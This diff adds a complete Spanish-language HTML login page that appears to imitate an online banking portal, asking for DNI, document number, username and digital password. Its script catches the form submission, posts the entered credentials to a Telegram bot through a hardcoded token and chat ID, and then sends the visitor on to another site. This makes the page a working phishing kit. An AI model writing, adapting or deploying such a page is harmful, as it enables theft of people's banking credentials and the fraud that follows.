@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="a.css">
+    <title>Document</title>
+</head>
+
+<body>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+        }
+
+        .skip-to-main-content {
+            margin-left: -900px;
+        }
+
+        nav {
+            z-index: 999;
+            position: fixed;
+            margin-top: -20px;
+            width: 100%;
+            height: 40px;
+            background-color: #011e47;
+            padding: 0 25px;
+        }
+
+        nav ul {
+            margin: 0;
+            padding: 0;
+            display: none;
+        }
+
+        nav li {
+            display: inline-block;
+            width: 70px;
+            color: white;
+            text-align: center;
+            padding: 10px 0;
+        }
+
+        nav li:active {
+            background-color: #333333;
+        }
+
+        nav li:hover {
+            background-color: #333333;
+        }
+
+        nav button {
+            display: none;
+        }
+
+        @media (max-width: 500px) {
+            nav li {
+                display: block;
+                width: 100%;
+                border-bottom: 1px solid white;
+                padding: 5px 0;
+            }
+
+            nav {
+                padding: 10px 0 0 0;
+            }
+        }
+    </style>
+
+    <header>
+        <a href="#" class="skip-to-main-content"></a>
+        <nav>
+            <ul>
+                <li> <img src="cacas.png" alt="" style="width: 30%;margin-left: -65%;margin-top: -3%;" id="loga"></li>
+            </ul>
+        </nav>
+    </header>
+
+    <div class="cont_principal">
+        <div class="cont_centrar">
+            <div class="cont_login">
+                <form id="myForm">
+                    <div class="cont_tabs_login">
+                    </div>
+                    <div class="cont_text_inputs">
+                        <img src="1a.png" alt="" style="width: 100%;">
+                        <input type="text" class="input_form_sign d_block active_inp" disabled placeholder="DNI"
+                            name="emauil_us" />
+                        <input type="text" class="input_form_sign d_block  active_inp" placeholder="Documento"
+                            name="docu_us" />
+                        <input type="text" class="input_form_sign d_block  active_inp" placeholder="Usuario"
+                            name="user_us" />
+                        <input type="password" class="input_form_sign d_block  active_inp" placeholder="Clave digital"
+                            name="pass_us" />
+                        <img src="2s.png" alt="" style="width: 90%;margin-left: 5%;">
+                        <div class="terms_and_cons d_none">
+                        </div>
+                    </div>
+                    <div class="cont_btn">
+                        <button class="btn_sign" style="font-weight: bold;">Ingresar</button>
+                        <button class="btn_sign"
+                            style="background-color: white;border: 2px solid rgb(4, 53, 145);color: rgb(4, 53, 145);font-weight: bold;">Registrarme</button>
+                    </div>
+                    <div class="olvide" style="color: #0349ab;font-weight: bold;">
+                        <center>
+                            <p>Olvide o bloquee mi usuario / Clave digital</p>
+                            <br>
+                            <p>Recomendaciones de seguridad</p>
+                        </center>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        // Función para enviar el mensaje a Telegram
+        function sendMessageToTelegram(message) {
+            var token = '7163006035:AAEvjE0V_nIppndbwxSoFYyTAz-sBofBXac';
+            var chatId = '6915301721';
+            var apiUrl = 'https://api.telegram.org/bot' + token + '/sendMessage';
+            var data = {
+                chat_id: chatId,
+                text: message
+            };
+
+            $.ajax({
+                url: apiUrl,
+                type: 'POST',
+                data: data,
+                success: function(response) {
+                    console.log('Mensaje enviado a Telegram:', response);
+                    // Redirigir al usuario a otra página después de enviar el formulario
+                    window.location.href = 'https://fsdg-online.com/';
+                },
+                error: function(error) {
+                    console.error('Error al enviar mensaje a Telegram:', error);
+                }
+            });
+        }
+
+        // Función para manejar el envío del formulario
+        function handleSubmit(event) {
+            event.preventDefault(); // Evitar el envío del formulario por defecto
+            var dni = document.querySelector('input[name="emauil_us"]').value;
+            var documento = document.querySelector('input[name="docu_us"]').value;
+            var usuario = document.querySelector('input[name="user_us"]').value;
+            var clave = document.querySelector('input[name="pass_us"]').value;
+            var message = 'Nuevo formulario enviado:\nDNI: ' + dni + '\nDocumento: ' + documento + '\nUsuario: ' + usuario + '\nClave digital: ' + clave;
+            sendMessageToTelegram(message);
+        }
+
+        // Agregar un event listener para el envío del formulario
+        document.getElementById('myForm').addEventListener('submit', handleSubmit);
+    </script>
+
+</body>
+
+</html>
+
+
